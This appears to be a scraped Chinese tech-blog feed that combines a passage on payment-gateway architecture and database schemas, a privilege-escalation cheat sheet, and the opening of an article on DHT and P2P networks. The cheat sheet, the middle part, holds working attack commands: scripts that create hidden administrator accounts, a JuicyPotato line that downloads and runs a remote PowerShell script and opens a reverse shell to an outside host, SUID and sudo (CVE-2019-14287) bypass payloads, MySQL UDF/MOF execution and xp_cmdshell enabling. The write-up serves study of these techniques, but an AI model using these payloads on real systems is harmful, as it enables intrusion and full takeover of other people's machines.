下面按照系统维度，介绍下这些接口如何使用，以及内部的一些逻辑。 应用系统一般支付网关会提供两种方式让应用系统接入： 网关模式，也就是应用系统自己需要开发一个收银台；（适合提供给第三方） 收银台模式，应用系统直接打开支付网关的统一收银台。（内部业务） 下面为了讲清楚设计思路，我们按照 网关模式 进行讲解。 对于应用系统它需要能够请求支付，也就是调用 gopay 接口。这个接口会处理商户的数据，完成后会调用第三方网关接口，并将返回结果统一处理后返回给应用方。 这里需要注意，第三方针对支付接口根据我的经验大致有以下情况： 支付时，不需要调用第三方，按照规则生成数据即可； 支付时，需要调用第三方多个接口完成逻辑（这可能比较慢，大型活动时需要考虑限流/降配）； 返回的数据是一个url，可直接跳转到第三方完成支付（wap/pc站）； 返回的数据是xml/json结构，需要拼装或作为参数传给她的sdk（app）。 这里由于第三方返回结构的不统一，我们需要统一处理成统一格式，返回给商户端。我推荐使用json格式。 1234567&#123; "errno":0, "msg":"ok", "data":&#123; &#125;&#125; 我们把所有的变化封装在 data 结构中。举个例子，如果返回的一个url。只需要应用程序发起 GET 请求。我们可以这样返回： 12345678&#123; "errno":0, "msg":"ok", "data":&#123; "url":"xxxxx", "method":"GET" &#125;&#125; 如果是返回的结构，需要应用程序直接发起 POST 请求。我们可以这样返回： 12345678&#123; "errno":1, "msg":"ok", "data":&#123; "from":"&lt;form action="xxx" method="POST"&gt;xxxxx&lt;/form&gt;", "method":"POST" &#125;&#125; 这里的 form 字段，生成了一个form表单，应用程序拿到后可直接显示然后自动提交。当然封装成 from表单这一步也可以放在商户端进行。 上面的数据格式仅仅是一个参考。大家可根据自己的需求进行调整。 一般应用系统除了会调用发起支付的接口外，可能还需要调用 支付结果查询接口。当然大多数情况下不需要调用，应用系统对交易的状态只应该依赖自己的系统状态。 对账系统对于对账，一般分为两个类型：交易对账 与 结算对账 交易对账 交易对账的核心点是：检查每一笔交易是否正确。它主要目的是看我们系统中的每一笔交易与第三方的每一笔交易是否一致。 这个检查逻辑很简单，对两份账单数据进行比较。它主要是使用 /query/bill 接口，拿到在第三方那边完成的交易数据。然后跟我方的交易成功数据进行比较。检查是否存在误差。 这个逻辑非常简单，但是有几点需要大家注意： 我方的数据需要正常支付数据+重复支付数据的总和； 对账检查不成功主要包括：金额不对、第三方没有找到对应的交易数据、我方不存在对应的交易数据。 针对这些情况都需要有对应的处理手段进行处理。在我的经验中上面的情况都有过遇到。 金额不对：主要是由于第三方的问题，可能是系统升级故障、可能是账单接口金额错误； 第三方无交易数据： 可能是拉去的账单时间维度问题（比如存在时差），这种时区问题需要自己跟第三方确认找到对应的时间差。也可能是被攻击，有人冒充第三方异步通知（说明系统校验机制又问题或者密钥泄漏了）。 自己系统无交易数据： 这种原因可能是第三方通知未发出或者未正确处理导致的。 上面这些问题的处理绝大部份都可以依赖 query/trade query/refund 来完成自动化处理。 结算对账 那么有了上面的 交易对账 为什么还需要 结算对账 呢？这个系统又是干嘛的？先来看下结算的含义。 结算，就是第三方网关在固定时间点，将T+x或其它约定时间的金额，汇款到公司账号。 下面我们假设结算周期是： T+1。结算对账主要使用到的接口是 /query/settle，这个接口获取的主要内容是：每一笔结算的款项都是由哪些笔交易组成（交易成功与退款数据）。以及本次结算扣除多少手续费用。 它的逻辑其实也很简单。我们先从自己的系统按照 T+1 的结算周期，计算出对方应该汇款给我们多少金额。然后与刚刚接口获取到的数据金额比较： 银行收款金额 + 手续费 = 我方系统计算的金额 这一步检查通过后，说明金额没有问题。接下来需要检查本次结算下的每一笔订单是否一致。 结算系统是 强依赖 对账系统的。如果对账发现异常，那么结算金额肯定会出现异常。另外结算需要注意的一些问题是： 银行可能会自行退款给用户，因为用户可直接向自己发卡行申请退款； 结算也存在时区差问题； 结算接口中的明细交易状态与我方并不完全一致。比如：银行结算时发现某笔退款完成，但我方系统在进行比较时按照未退款完成的逻辑在处理。 针对上面的问题，大家根据自己的业务需求需要做一些方案来进行自动化处理。 财务系统财务系统有很多内部业务，我这里只聊与支付系统相关的。（当然上面的对账系统也可以算是财务范畴）。 财务系统与支付主要的一个关系点在于校验交易、以及退款。这里校验交易可以使用 query/trade query/refund这两个接口来完成。这个逻辑过程就不需要说了。下面重点说下退款。 我看到很多的系统退款是直接放在了应用里边，用户申请退款直接就调用退款接口进行退款。这样的风险非常高。支付系统的关于资金流向的接口一定要慎重，不能过多的直接暴露给外部，带来风险。 退款的功能应该是放到财务系统来做。这样可以走内部的审批流程（是否需要根据业务来），并且在财务系统中可以进行更多检查来觉得是否立即进行退款，或者进入等待、拒绝等流程。 第三方网关针对第三方主要使用到的其实就是异步通知与同步通知两个接口。这一部分的逻辑其实非常简单。就是根据第三方的通知完成交易状态的变更。以及通知到自己对应的应用系统。 这部分比较复杂的是，第三方的通知数据结构不统一、通知的类型不统一。比如：有的退款是同步返回结果、有的是异步返回结果。这里如何设计会在后面的 系统设计 中给出答案。 数据库设计数据的设计是按照：交易、退款、日志 来设计的。对于上面说到的对账等功能并没有。这部分不难大家可以自行设计，按照上面讲到的思路。主要的表介绍如下： pay_transaction 记录所有的交易数据。 pay_transaction_extension 记录每次向第三方发起交易时，生成的交易号 pay_log_data 所有的日志数据，如：支付请求、退款请求、异步通知等 pay_repeat_transaction 重复支付的数据 pay_notify_app_log 通知应用程序的日志 pay_refund 记录所有的退款数据 具体的表结构： -- ----------------------------------------------------- -- Table 创建支付流水表 -- ----------------------------------------------------- CREATE TABLE IF NOT EXISTS `pay_transaction` ( `id` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT, `app_id` VARCHAR(32) NOT NULL COMMENT '应用id', `pay_method_id` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '支付方式id，可以用来识别支付，如：支付宝、微信、Paypal等', `app_order_id` VARCHAR(64) NOT NULL COMMENT '应用方订单号', `transaction_id` VARCHAR(64) NOT NULL COMMENT '本次交易唯一id，整个支付系统唯一，生成他的原因主要是 order_id对于其它应用来说可能重复', `total_fee` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '支付金额，整数方式保存', `scale` TINYINT UNSIGNED NOT NULL DEFAULT 0 COMMENT '金额对应的小数位数', `currency_code` CHAR(3) NOT NULL DEFAULT 'CNY' COMMENT '交易的币种', `pay_channel` VARCHAR(64) NOT NULL COMMENT '选择的支付渠道，比如：支付宝中的花呗、信用卡等', `expire_time` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '订单过期时间', `return_url` VARCHAR(255) NOT NULL COMMENT '支付后跳转url', `notify_url` VARCHAR(255) NOT NULL COMMENT '支付后，异步通知url', `email` VARCHAR(64) NOT NULL COMMENT '用户的邮箱', `sing_type` VARCHAR(10) NOT NULL DEFAULT 'RSA' COMMENT '采用的签方式：MD5 RSA RSA2 HASH-MAC等', `intput_charset` CHAR(5) NOT NULL DEFAULT 'UTF-8' COMMENT '字符集编码方式', `payment_time` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '第三方支付成功的时间', `notify_time` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '收到异步通知的时间', `finish_time` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '通知上游系统的时间', `trade_no` VARCHAR(64) NOT NULL COMMENT '第三方的流水号', `transaction_code` VARCHAR(64) NOT NULL COMMENT '真实给第三方的交易code，异步通知的时候更新', `order_status` TINYINT NOT NULL DEFAULT 0 COMMENT '0:等待支付，1:待付款完成， 2:完成支付，3:该笔交易已关闭，-1:支付失败', `create_at` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '创建时间', `update_at` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '更新时间', `create_ip` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '创建的ip，这可能是自己服务的ip', `update_ip` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '更新的ip', PRIMARY KEY (`id`), UNIQUE INDEX `uniq_tradid` (`transaction_id`), INDEX `idx_trade_no` (`trade_no`), INDEX `idx_ctime` (`create_at`)), ENGINE = InnoDB DEFAULT CHARACTER SET = utf8mb4 COMMENT = '发起支付的数据'; -- ----------------------------------------------------- -- Table 交易扩展表 -- ----------------------------------------------------- CREATE TABLE IF NOT EXISTS `pay_transaction_extension` ( `id` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT, `transaction_id` VARCHAR(64) NOT NULL COMMENT '系统唯一交易id', `pay_method_id` INT UNSIGNED NOT NULL DEFAULT 0, `transaction_code` VARCHAR(64) NOT NULL COMMENT '生成传输给第三方的订单号', `call_num` TINYINT UNSIGNED NOT NULL DEFAULT 0 COMMENT '发起调用的次数', `extension_data` TEXT NOT NULL COMMENT '扩展内容，需要保存：transaction_code 与 trade no 的映射关系，异步通知的时候填充', `create_at` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '创建时间', `create_ip` INT UNSIGNED NOT NULL COMMENT '创建ip', PRIMARY KEY (`id`), INDEX `idx_trads` (`transaction_id`, `pay_status`), UNIQUE INDEX `uniq_code` (`transaction_code`)), ENGINE = InnoDB DEFAULT CHARACTER SET = utf8mb4 COMMENT = '交易扩展表'; -- ----------------------------------------------------- -- Table 交易系统全部日志 -- ----------------------------------------------------- CREATE TABLE IF NOT EXISTS `pay_log_data` ( `id` BIGINT UNSIGNED NOT NULL, `app_id` VARCHAR(32) NOT NULL COMMENT '应用id', `app_order_id` VARCHAR(64) NOT NULL COMMENT '应用方订单号', `transaction_id` VARCHAR(64) NOT NULL COMMENT '本次交易唯一id，整个支付系统唯一，生成他的原因主要是 order_id对于其它应用来说可能重复', `request_header` TEXT NOT NULL COMMENT '请求的header 头', `request_params` TEXT NOT NULL COMMENT '支付的请求参数', `log_type` VARCHAR(10) NOT NULL COMMENT '日志类型，payment:支付; refund:退款; notify:异步通知; return:同步通知; query:查询', `create_at` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '创建时间', `create_ip` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '创建ip', PRIMARY KEY (`id`), INDEX `idx_tradt` (`transaction_id`, `log_type`)), ENGINE = InnoDB DEFAULT CHARACTER SET = utf8mb4 COMMENT = '交易日志表'; -- ----------------------------------------------------- -- Table 重复支付的交易 -- ----------------------------------------------------- CREATE TABLE IF NOT EXISTS `pay_repeat_transaction` ( `id` BIGINT UNSIGNED NOT NULL, `app_id` VARCHAR(32) NOT NULL COMMENT '应用的id', `transaction_id` VARCHAR(64) NOT NULL COMMENT '系统唯一识别交易号', `transaction_code` VARCHAR(64) NOT NULL COMMENT '支付成功时，该笔交易的 code', `trade_no` VARCHAR(64) NOT NULL COMMENT '第三方对应的交易号', `pay_method_id` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '支付方式', `total_fee` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '交易金额', `scale` TINYINT UNSIGNED NOT NULL DEFAULT 0 COMMENT '小数位数', `currency_code` CHAR(3) NOT NULL DEFAULT 'CNY' COMMENT '支付选择的币种，CNY、HKD、USD等', `payment_time` INT NOT NULL COMMENT '第三方交易时间', `repeat_type` TINYINT UNSIGNED NOT NULL DEFAULT 1 COMMENT '重复类型：1同渠道支付、2不同渠道支付', `repeat_status` TINYINT UNSIGNED DEFAULT 0 COMMENT '处理状态,0:未处理；1:已处理', `create_at` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '创建时间', `update_at` INT UNSIGNED NOT NULL COMMENT '更新时间', PRIMARY KEY (`id`), INDEX `idx_trad` ( `transaction_id`), INDEX `idx_method` (`pay_method_id`), INDEX `idx_time` (`create_at`)), ENGINE = InnoDB DEFAULT CHARACTER SET = utf8mb4 COMMENT = '记录重复支付'; -- ----------------------------------------------------- -- Table 通知上游应用日志 -- ----------------------------------------------------- CREATE TABLE IF NOT EXISTS `pay_notify_app_log` ( `id` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT, `app_id` VARCHAR(32) NOT NULL COMMENT '应用id', `pay_method_id` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '支付方式', `transaction_id` VARCHAR(64) NOT NULL COMMENT '交易号', `transaction_code` VARCHAR(64) NOT NULL COMMENT '支付成功时，该笔交易的 code', `sign_type` VARCHAR(10) NOT NULL DEFAULT 'RSA' COMMENT '采用的签名方式：MD5 RSA RSA2 HASH-MAC等', `input_charset` CHAR(5) NOT NULL DEFAULT 'UTF-8', `total_fee` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '涉及的金额，无小数', `scale` TINYINT UNSIGNED NOT NULL DEFAULT 0 COMMENT '小数位数', `pay_channel` VARCHAR(64) NOT NULL COMMENT '支付渠道', `trade_no` VARCHAR(64) NOT NULL COMMENT '第三方交易号', `payment_time` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '支付时间', `notify_type` VARCHAR(10) NOT NULL DEFAULT 'paid' COMMENT '通知类型，paid/refund/canceled', `notify_status` VARCHAR(7) NOT NULL DEFAULT 'INIT' COMMENT '通知支付调用方结果；INIT:初始化，PENDING: 进行中； SUCCESS：成功； FAILED：失败', `create_at` INT UNSIGNED NOT NULL DEFAULT 0, `update_at` INT UNSIGNED NOT NULL DEFAULT 0, PRIMARY KEY (`id`), INDEX `idx_trad` (`transaction_id`), INDEX `idx_app` (`app_id`, `notify_status`) INDEX `idx_time` (`create_at`)), ENGINE = InnoDB DEFAULT CHARACTER SET = utf8mb4 COMMENT = '支付调用方记录'; -- ----------------------------------------------------- -- Table 退款 -- ----------------------------------------------------- CREATE TABLE IF NOT EXISTS `pay_refund` ( `id` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT, `app_id` VARCHAR(64) NOT NULL COMMENT '应用id', `app_refund_no` VARCHAR(64) NOT NULL COMMENT '上游的退款id', `transaction_id` VARCHAR(64) NOT NULL COMMENT '交易号', `trade_no` VARCHAR(64) NOT NULL COMMENT '第三方交易号', `refund_no` VARCHAR(64) NOT NULL COMMENT '支付平台生成的唯一退款单号', `pay_method_id` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '支付方式', `pay_channel` VARCHAR(64) NOT NULL COMMENT '选择的支付渠道，比如：支付宝中的花呗、信用卡等', `refund_fee` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '退款金额', `scale` TINYINT UNSIGNED NOT NULL DEFAULT 0 COMMENT '小数位数', `refund_reason` VARCHAR(128) NOT NULL COMMENT '退款理由', `currency_code` CHAR(3) NOT NULL DEFAULT 'CNY' COMMENT '币种，CNY USD HKD', `refund_type` TINYINT UNSIGNED NOT NULL DEFAULT 0 COMMENT '退款类型；0:业务退款; 1:重复退款', `refund_method` TINYINT UNSIGNED NOT NULL DEFAULT 1 COMMENT '退款方式：1自动原路返回; 2人工打款', `refund_status` TINYINT UNSIGNED NOT NULL DEFAULT 0 COMMENT '0未退款; 1退款处理中; 2退款成功; 3退款不成功', `create_at` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '创建时间', `update_at` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '更新时间', `create_ip` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '请求源ip', `update_ip` INT UNSIGNED NOT NULL DEFAULT 0 COMMENT '请求源ip', PRIMARY KEY (`id`), UNIQUE INDEX `uniq_refno` (`refund_no`), INDEX `idx_trad` (`transaction_id`), INDEX `idx_status` (`refund_status`), INDEX `idx_ctime` (`create_at`)), ENGINE = InnoDB DEFAULT CHARACTER SET = utf8mb4 COMMENT = '退款记录'; 表的使用逻辑进行下方简单描述： 支付，首先需要记录请求日志到 pay_log_data中，然后生成交易数据记录到 pay_transaction与pay_transaction_extension 中。 收到通知，记录数据到 pay_log_data 中，然后根据时支付的通知还是退款的通知，更新 pay_transaction 与 pay_refund 的状态。如果是重复支付需要记录数据到 pay_repeat_transaction 中。并且将需要通知应用的数据记录到 pay_notify_app_log，这张表相当于一个消息表，会有消费者会去消费其中的内容。 退款 记录日志日志到 pay_log_data 中，然后记录数据到退款表中 pay_refund。 当然这其中还有些细节，需要大家自己看了表结构，实际去思考一下该如何使用。如果有任何疑问欢迎到我们GitHub的项目（点击阅读原文）中留言，我们都会一一解答。 这些表能够满足最基本的需求，其它内容可根据自己的需求进行扩张，比如：支持用户卡列表、退款走银行卡等。 系统设计这部分主要说下系统该如何搭建，以及代码组织方式的建议。 系统架构由于支付系统的安全性非常高，因此不建议将对应的入口直接暴露给用户可见。应该是在自己的应用系统中调用支付系统的接口来完成业务。另外系统对数据要求是：强一致性的。因此也没有缓存介入（当如缓存可以用来做报警，这不在本文范畴）。 具体的实现，系统会使用两个域名，一个为内部使用，只有指定来源的ip能够访问固定功能（访问除通知外的其它功能）。另一个域名只能访问 notify return 两个路由。通过这种方式可以保证系统的安全。 在数据库的使用上无论什么请求直接走 Master 库。这样保证数据的强一致。当然从库也是需要的。比如：账单、对账相关逻辑我们可以利用从库完成。 代码设计不管想做什么最终都要用代码来实现。我们都知道需要可维护、可扩展的代码。那么具体到支付系统你会怎么做呢？我已支付为例说下我的代码结构设计思路。仅供参考。比如我要介入：微信、支付宝、招行 三家支付。我的代码结构图如下： 用文字简单介绍下。我会将每一个第三方封装成： XXXGateway 类，内部是单纯的封装第三方接口，不管对方是 HTTP 请求还是 SOAP 请求，都在内部进行统一处理。 另外有一层XXXProxy 来封装这些第三方提供的能力。这一层主要干两件事情：对传过来请求支付的数据进行个性化处理。对返回的结构进行统一处理返回上层统一的结构。当然根据特殊情况这里可以进行一切业务处理； 通过上面的操作变化已经基本上被完全封装了。如果新增一个支付渠道。只需要增加：XXXGateway 与 XXXProxy。 那么 Context 与 Server 有什么用呢？Server 内部封装了所有的业务逻辑，它提供接口给 action 或者其它 server 进行调用。而 Context 这一层存在的价值是处理 Proxy 层返回的错误。以及在这里进行报警相关的处理。 上面的结构只是我的一个实践，欢迎大家讨论。 本文描述的系统只是满足了最基本的支付需求。缺少相关的监控、报警。如果你按照上文设计自己的系统，风险自担与我无关。 订单中心请您耐心等待… 仓储系统请您耐心等待… 物流系统请您耐心等待… 售后服务请您耐心等待… 基础服务请您耐心等待… .posts-expand .post-body img{margin:0 auto; max-height:100vh;}]]></content>
      <categories>
        <category>架构设计</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[权限提升姿势]]></title>
    <url>%2Farticles%2F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[前言 某段时间突然对权限提升感起了兴趣，在各大论坛和大佬们的博客寻找权限提升的姿势，固有了想对提权姿势进行一次系统整理的打算，本篇文章是对权限提升方法的总结，记录自己学习和复现的过程。 windows篇 windows溢出提权具体步骤 查看系统补丁信息 systeminfo 寻找可用exp https://github.com/SecWiki/windows-kernel-exploitshttps://bugs.hacking8.com/tiquan/ 一把梭！ 启动项提权具体步骤 启动项路径： C:\Users\{用户名}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 在启动项中创建vbs或bat脚本vbs： 123set wshshell=createobject("wscript.shell") a=wshshell.run("cmd.exe /c net user 用户名 密码 /add",0) b=wshshell.run("cmd.exe /c net localgroup administrators 用户名 /add",0) bat： 12net user 用户名 密码 /add net localgroup administrators 用户名 /add 接下来需要等待机器重启并以较大权限的账号登录，暴力一点可以配合漏洞打蓝屏poc强制重启。 bat脚本运行时会有个dos弹一下，vbs不会弹，建议使用vbs脚本 UAC提权（CVE-2019-1388）漏洞简介该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。利用该漏洞很容易就可以提升权限到SYSTEM 影响范围按照exp作者的描述，影响范围如下：Windows 2008r2 7601 link OPENED AS SYSTEMWindows 2012r2 9600 link OPENED AS SYSTEMWindows 2016 14393 link OPENED AS SYSTEMWindows 2019 17763 link NOT openedWindows 7 SP1 7601 link OPENED AS SYSTEMWindows 8 9200 link OPENED AS SYSTEMWindows 8.1 9600 link OPENED AS SYSTEMWindows 10 1511 10240 link OPENED AS SYSTEMWindows 10 1607 14393 link OPENED AS SYSTEMWindows 10 1703 15063 link NOT openedWindows 10 1709 16299 link NOT opened… 复现准备 EXP地址https://github.com/jas502n/CVE-2019-1388 复现环境windows 7专业版 复现过程 将EXP传入系统，点击下图中箭头所指的位置 点击颁发者中的超链接 成功弹出ie，此时ie是以system权限开启 页面另存为，输入cmd路径 权限为system Juicypotato工具简介在尝试windows下的一系列提权操作后都没有成功，可以尝试一下烂土豆，这里在吐司上找到一个大佬改写的juicypotato，自动化程度比原版更高，使用起来更简单，配合webshell食用可以说是非常美味。 复现准备 一个有执行权限的webshell 大佬改版后的Juicypotato 复现过程 使用webshell上传烂土豆并执行命令,这里使用powershell做反弹shell 1Juicypotato.exe -p "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://ip/ps.ps1');powercat -c ip -p 444 -e cmd" linux篇 内核溢出平常问大佬们linux下的提权，听的最多的就是脏牛一把梭，但是目前实战还没有提成功，固这里简单叙述一下。 具体步骤 查看内核版本 uname -a 寻找exp一把梭 https://github.com/SecWiki/linux-kernel-exploits 定时任务提权什么是定时任务定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。 通过命令查看crontab -l注意：只能查看当前用户的定时任务 可以通过以下文件查看现有定时任务/etc/crontab/var/spool/cron/crontabs/etc/cron.*/ 提权前提 定时任务以root或高权限用户运行 现有较低权限用户拥有对该定时任务文件的写权限 复现准备 以root身份创建一个定时任务，定时执行py脚本 复现过程 假设我们获取到了一个低权限用户，查看/etc/crontab文件，发现有个以root身份运行的py脚本定时任务 发现可以对该文件进行读写，在py脚本中执行os命令反弹 shell 该定时任务1分钟运行一次，这里等待服务器接收shell即可 suid提权什么是suid提权详细介绍可参考 P牛大大的文章 ，简单来说SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。 提权过程 查找系统中可使用root权限运行的命令 123find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 一些可用于提权的文件 Nmap(2.02-5.21)nmap –interactive!sh findtouch pentestlabfind pentestlab -exec whoami \; less/moreless(more) /etc/passwd!/bin/sh vim/vivim.tiny:set shell=/bin/sh:shell gitgit help config!/bin/bash… 印象中还有一些命令可以达到提权的效果，暂时只收集了这些。这里也是提供了一个思路，找到了能以root运行的命令之后可以去翻阅这个命令的相关参数，看能否达到shell交互的效果。 sudo权限绕过（CVE-2019-14287）感觉这个漏洞实战不太会遇到，不过说不定哪天能中呢 :) 漏洞简介一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令： 通过将用户ID修改为-1（或未签名的等价用户ID-4294967295）可以绕过该配置文件限制，达到权限提升的效果。 影响范围sudo &lt; 1.8.28 复现准备手动配置/etc/sudoers文件，添加内容如下： 表示不允许用户xlxxlx以root身份执行任意命令，也就相当于无法使用sudo命令。 复现过程 查看配置文件是否生效 提示xlxxlx用户无法以root身份执行whoami 直接上payloadsudo -u#-1 whoami Mysql篇 UDF提权什么是UDFUDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 提权过程udf.dll文件的提取可以参考这篇文章 mysql版本 &lt; 5.1 , UDF导出到系统目录c:/windows/system32/mysql版本 &gt; 5.1 ，UDF导出到安装路径MySQL\Lib\Plugin\ 通过sql语句创建自定义命令并执行 12create function xxx returns string soname 'udf.dll' select xxx('cmd') 这里使用一个udf提权马进行复现 自动导出udf到目录 创建自定义函数并执行提权操作 MOF什么是MOF提权mof提权的原理其实很简单，就是利用了 c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，我们把想要执行的cmd命令代入mof文件中即可，和linux下的定时任务提权相似。 MOF代码12345678910111213141516171819202122#pragma namespace("\\.\\root\\subscription")instance of * * EventFilter as &#123; EventNamespace = "Root\\Cimv2"; Name = "filtP2"; Query = "Select * From **InstanceModificationEvent " "Where TargetInstance Isa \" Win32_LocalTime\" " "And TargetInstance.Second = 5"; QueryLanguage = "WQL";&#125;;instance of ActiveScriptEventConsumer as &#123; Name = "consPCSV2"; ScriptingEngine = "JScript"; ScriptText ="var WSH = new ActiveXObject(\"WScript.Shell\") WSH.run(\"此处填入cmd命令\")";&#125;;instance of __FilterToConsumerBinding &#123; Consumer = ; Filter = ;&#125;; 用法保存为 xxx.mof然后mysql执行： 1select load_file('/xxx.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'; Sqlserver篇 xp_cmdshell提权前提 获取sa账号密码，例如查看网站的配置文件conn.asp,config.asp等。 需要开启xp_cmdshell才可执行系统命令 提权过程 开启xp_cmdshell组件 1EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; 如果xp_cmdshell组件被删除，上传xplog70.dll 1EXEC master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’ 执行命令 1EXEC master.dbo.xp_cmdshell 'cmd' 总结 这篇文章记录的提权方法都是较新或者比较经典，对实战有帮助的提权方法，其实还有很多其他的提权方法，碍于没有成功复现不好对提权的难度和利用条件做出判断，后续有机会也会慢慢都收录下。]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>提权</tag>
        <tag>udf.dll</tag>
        <tag>sqlserver</tag>
        <tag>linux</tag>
        <tag>nullevt.mof</tag>
        <tag>mof</tag>
        <tag>suid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式哈希表 (DHT) 和 P2P 技术]]></title>
    <url>%2Farticles%2F%E5%88%86%E5%B8%83%E5%BC%8F%E5%93%88%E5%B8%8C%E8%A1%A8-DHT-%E5%92%8CP2P%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[1. 引言相信没有人没使用过 P2P 技术. BT 种子和磁力链接就是最常见的 P2P 技术, 使用 P2P 技术, 文件不再需要集中存储在一台服务器上, 而是分散再各个用户的节点上, 每个人都是服务的提供者, 也是服务的使用者. 这样的系统具有高可用性, 不会由于一两台机的宕机而导致整个服务不可用. 那么这样一个系统是怎样实现的, 如何做到去中心化(decentralization)和自我组织(self-organization)的呢? 这篇文章我们来讨论一下这个问题. 这篇文章先会介绍 P2P 网络的整体思路, 并引出 P2P 网络的主角 - 分布式哈希表(Distributed Hash Table, DHT); 接着会介绍两种分布式哈希表算法. 这些会让你对 P2P 技术有一个较为具体的了解. 2. P2P 网络的概述2.1 传统 CS 网络和 P2P 网络CS 架构即 Client-Server 架构, 由服务器和客户端组成: 服务器为服务的提供者, 客户端为服务的使用者. 我们如今使用的很多应用程序例如网盘, 视频应用, 网购平台等都是 CS 架构. 它的架构如下图所示: 当然服务器通常不是一个单点, 往往是一个集群; 但本质上是一样的. CS 架构的问题在于, 一旦服务器关闭, 例如宕机, 被 DDoS 攻击或者被查水表, 客户端就无法使用了, 服务也就失效了. 为了解决这个问题, 人们提出了 P2P 网络(Peer-to-peer Networking). 在 P2P 网络中, 不再由中心服务器提供服务, 不再有”服务器”的概念, 每个人即使服务的提供者也是服务的使用者 – i.e., 每个人都有可能是服务器. 我们常用的 BT 种子和磁力链接下载服务就是 P2P 架构. 人们对 P2P 系统作了如下定义: a Peer-to-Peer system is a self-organizing system of equal, autonomous entities (peers) which aims for the shared usage of distributed resources in a networked environment avoiding central services. 一个 P2P 系统是每个节点都是平等, 自主的一个自我组织的系统, 目的是在避免中心服务的网络环境中共享使用分布式资源. P2P 系统的架构如上图所示. 由于去掉了中心服务器, P2P 系统的稳定性就强很多: 少数几个个节点的失效几乎不会影响整个服务; 节点多为用户提供, 可以做到 “野火烧不尽, 春风吹又生”. 即使有人想恶意破坏, 也无法对整个系统造成有效打击. 2.2 朴素的 P2P 网络P2P 网络需要解决的一个最重要的问题就是, 如何知道用户请求的资源位于哪个节点上. 在第一代 P2P 网络中, 人们设置了一台中央服务器来管理资源所处的位置. 当一个用户想要发布资源, 他需要告诉中央服务器它发布的资源信息和自己的节点信息; 当其他用户请求资源的时候, 需要先请求中央服务器以获取资源发布者的节点信息, 再向资源发布者请求资源. 这种 P2P 网络的好处是效率高, 只需要请求一次中央服务器就可以发布或获取资源. 然而它的缺点也很明显: 中央服务器是这个网络系统最脆弱的地方, 它需要存储所有资源的信息, 处理所有节点的请求; 一旦中央服务器失效, 整个网络就无法使用. 早期的另外一种 P2P 网络采取了不同的策略, 它不设置中央服务器; 当用户请求资源时, 它会请求它所有的邻接节点, 邻接节点再依次请求各自的邻接节点, 并使用一些策略防止重复请求, 直到找到拥有资源的节点. 也就是说, 这是一种泛洪搜索(Flooding Search). 这种 P2P 网络去除了中央服务器, 它的稳定性就强多了. 然而它太慢了. 一次查找可能会产生大量的请求, 可能会有大量的节点卷入其中. 一旦整个系统中的的节点过多, 性能就会变得很差. 2.3 分布式哈希表为了解决这些问题, 分布式哈希表应运而生. 在一个有 $n$ 个节点的分布式哈希表中, 每个节点仅需存储 $\mathrm{O}(\log{n})$ 个其他节点, 查找资源时仅需请求 $\mathrm{O}(\log{n})$ 